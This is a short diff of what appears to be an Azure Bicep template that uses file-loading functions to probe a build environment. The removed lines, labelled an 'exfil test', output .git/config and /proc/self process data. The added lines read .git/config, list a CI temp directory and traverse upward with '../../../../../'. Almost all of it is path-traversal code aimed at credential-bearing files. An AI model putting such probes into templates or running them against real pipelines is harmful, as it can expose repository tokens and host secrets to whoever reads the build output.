@@ -1,4 +1,5 @@
-// Comprehensive exfil test
-output gitConfig string = loadTextContent('../../.git/config')
-output fds array = loadDirectoryFileInfo('/proc/self/fd/', '*')
-output procCmdline string = loadTextContent('/proc/self/cmdline')
+var gitConfig = loadTextContent('../.git/config')
+var tempFiles = loadDirectoryFileInfo('../../_temp/', '*')
+
+// How far up can you go?
+var wayUp = loadDirectoryFileInfo('../../../../../', '*')
